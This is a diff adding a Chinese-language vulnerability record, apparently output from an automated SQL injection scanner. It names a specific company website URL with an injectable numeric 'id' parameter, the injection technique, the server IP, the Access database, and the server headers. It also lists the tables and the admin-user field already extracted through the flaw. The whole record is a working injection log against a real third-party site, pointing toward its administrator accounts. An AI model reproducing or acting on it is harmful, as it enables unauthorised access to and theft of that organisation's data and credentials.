@@ -1,0 +1,24 @@
+■漏洞信息:============================================================
+ ·URL:http://www.hfhthb.com/newshow.asp?id=694
+ ·页面标题：省发展改革委召开副处级领导职位竞职演说大会-合肥宏图环保科技有限公司
+ ·参数:id=694
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:218.85.133.141
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 11 Sep 2011 03:30:29 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 18932
+Content-Type: text/html
+Cache-control: private
+
+
+找到表:news
+找到表:admin_user
+找到字段:admin_user.id
